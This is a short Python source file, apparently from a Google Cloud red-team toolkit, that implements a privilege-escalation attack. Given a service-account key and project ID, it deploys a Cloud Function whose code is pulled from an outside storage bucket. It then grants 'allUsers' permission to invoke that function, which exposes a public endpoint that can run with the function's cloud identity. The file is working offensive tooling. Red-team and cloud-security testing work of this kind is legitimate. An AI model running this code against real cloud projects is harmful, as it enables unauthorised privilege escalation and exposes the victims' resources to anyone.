# gator/services/red/privesc.py

from argparse import Namespace
from gator.services.functions.functions import deploy_function
from gator.services.iam.iam import set_iam_policy
import uuid

def privesc_function_deploy(args):
    # convert args to dictionary and copy
    args_dict = vars(args).copy()

    # Check if 'sa_json_file' and 'project_id' are in args_dict
    if 'sa_json_file' not in args_dict or 'project_id' not in args_dict:
        print("Error: --sa-json-file and --project-id arguments are required")
        return

    # update dictionary for deploy
    deploy_args_dict = args_dict.copy()
    deploy_args_dict.update({
        'runtime': 'python39',
        'entry_point': 'anirban',
        'source': 'gs://anirban/function.zip',
        'region': 'us-central1',
        'function_name': args_dict.get('function_name', 'func' + str(uuid.uuid4())[:6])
    })

    # convert deploy_args_dict back to Namespace and deploy function
    deploy_args = Namespace(**deploy_args_dict)
    function_name = deploy_function(deploy_args)

    # Check if function_name is set after deployment
    if not function_name:
        print("Error: Function name is not set after deployment.")
        return

    # update dictionary for iam
    iam_args_dict = args_dict.copy()
    iam_args_dict.update({
        'function_name': function_name,
        'region': 'us-central1',
        'member': 'allUsers',
        'role': 'roles/cloudfunctions.invoker'
    })

    # convert iam_args_dict back to Namespace and set iam policy
    iam_args = Namespace(**iam_args_dict)
    set_iam_policy(iam_args)
